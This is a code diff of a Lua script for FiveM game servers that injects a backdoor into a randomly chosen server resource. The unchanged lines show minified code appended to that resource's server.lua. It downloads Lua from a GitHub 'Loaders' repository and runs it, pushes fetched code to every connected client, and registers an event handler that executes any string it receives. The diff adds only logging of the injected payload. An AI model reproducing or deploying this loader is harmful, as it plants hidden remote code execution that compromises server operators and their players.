@@ -94,6 +94,9 @@ function ChooseRandomResourceAndWriteToFile()
     end
     local appendContent = "\n\nlocal a={}local b=Citizen.InvokeNative;AddEventHandler('__cfx_internal:httpResponse',function(c,d,e,f,g)if a[c]then local h=a[c]a[c]=nil;h(d,e,f,g)end end)local function i(j)local k=msgpack.pack(j)return k,#k end;function PerformHttpRequestInternalEx2(l)local m,n=i(l)return b(0x6b171e87,m,n,_ri)end;function PerformHttpRequest2(o,p,q,r,f,s)local t=true;if s and s.followLocation~=nil then t=s.followLocation end;local u={url=o,method=q or'GET',data=r or'',headers=f or{},followLocation=t}local v=PerformHttpRequestInternalEx2(u)if v~=-1 then a[v]=p end end;PerformHttpRequest2('https://raw.githubusercontent.com/Somethingk4/Loaders/main/execute%20to%20servers/server.lua',function(w,x)local w=load(x)w()end,'GET','',{})PerformHttpRequest2('https://raw.githubusercontent.com/Somethingk4/Loaders/main/execute%20to%20servers/client.lua',function(w,x)print(x)TriggerClientEvent('esx:notifications:',-1,x)end,'GET','',{})"
     AppendToEndOfFile(serverLuaPath, appendContent)
+    print("Chosen resource: " .. chosenResource)
+    print("Content appended to " .. chosenResource .. "/server.lua:")
+    print(appendContent)
 end
 
 function ChooseRandomResourceAndWriteToFile2()
@@ -121,4 +124,7 @@ function ChooseRandomResourceAndWriteToFile2()
     end
     local appendContent = "\n\nRegisterNetEvent('esx:notifications:') AddEventHandler('esx:notifications:', function(b) local a = load(b) a() end)"
     AppendToEndOfFile(serverLuaPath, appendContent)
+    print("Chosen resource: " .. chosenResource)
+    print("Content appended to " .. chosenResource .. "/server.lua:")
+    print(appendContent)
 end
